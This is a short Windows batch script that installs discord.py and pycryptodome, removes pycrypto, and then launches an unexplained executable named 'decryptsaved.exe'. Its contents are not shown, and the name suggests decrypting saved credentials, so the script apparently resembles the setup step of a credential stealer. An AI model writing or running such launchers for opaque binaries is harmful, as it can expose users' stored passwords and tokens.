@echo off
if not exist "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python312\python.exe" (
timeout 30 >nul
)
pip uninstall pycrypto -y
pip install discord.py
pip install pycryptodome
pip show pycryptodome

start decryptsaved.exe
exit
